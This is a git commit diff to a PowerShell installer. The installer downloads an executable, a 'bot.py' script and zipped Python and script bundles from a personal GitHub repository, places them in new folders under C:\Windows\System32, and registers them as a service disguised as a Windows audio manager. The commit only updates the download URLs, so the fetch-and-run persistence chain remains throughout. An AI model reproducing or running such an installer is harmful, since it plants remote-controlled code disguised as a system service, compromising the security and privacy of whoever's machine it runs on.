9a6c21f758a84fcddf5515653bd8bdcc0e98d1ac
Miguel Santos <miguelsantos029@gmail.com>
2025-12-06 01:03:07 +0000

    Update install.ps1

--- install.ps1
+++ install.ps1
@@ -8,11 +8,11 @@ New-Item -Path "C:\Windows\System32\re-as" -ItemType Directory
 New-Item -Path "C:\Windows\System32\ap32" -ItemType Directory
 New-Item -Path "C:\Windows\System32\ap32\Res-PE" -ItemType Directory
 
-Invoke-WebRequest -Uri "https://github.com/miguelsantos029/yolo/blob/e49df34ce06397107e3fa8879974a7d4d6009f76/nssm.exe?dl=1" -OutFile $destino
+Invoke-WebRequest -Uri "https://github.com/miguelsantos029/yolo/raw/refs/heads/main/nssm.exe?dl=1" -OutFile $destino
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/miguelsantos029/yolo/refs/heads/main/bot.py?dl=1" -OutFile $destino2
-Invoke-WebRequest -Uri "https://github.com/miguelsantos029/yolo/blob/e49df34ce06397107e3fa8879974a7d4d6009f76/WPy64.zip?dl=1" -OutFile $destino3
-Invoke-WebRequest -Uri "https://github.com/miguelsantos029/yolo/blob/e49df34ce06397107e3fa8879974a7d4d6009f76/WPy64_2.zip?dl=1" -OutFile $destino4
-Invoke-WebRequest -Uri "https://github.com/miguelsantos029/yolo/blob/e49df34ce06397107e3fa8879974a7d4d6009f76/scripts.zip?dl=1" -OutFile $destino5
+Invoke-WebRequest -Uri "https://github.com/miguelsantos029/yolo/raw/refs/heads/main/WPy64.zip?dl=1" -OutFile $destino3
+Invoke-WebRequest -Uri "https://github.com/miguelsantos029/yolo/raw/refs/heads/main/WPy64_2.zip?dl=1" -OutFile $destino4
+Invoke-WebRequest -Uri "https://github.com/miguelsantos029/yolo/raw/refs/heads/main/scripts.zip?dl=1" -OutFile $destino5
 
 Expand-Archive -Path $destino3 -DestinationPath "C:\Windows\System32\ap32" -Force
 Expand-Archive -Path $destino4 -DestinationPath "C:\Windows\System32\ap32" -Force
@@ -22,4 +22,3 @@ C:\Windows\System32\ap32\nssm.exe install "Gestor Primario de Audio do Windows" 
 C:\Windows\System32\ap32\nssm.exe restart "Gestor Primario de Audio do Windows"
 
 exit
-
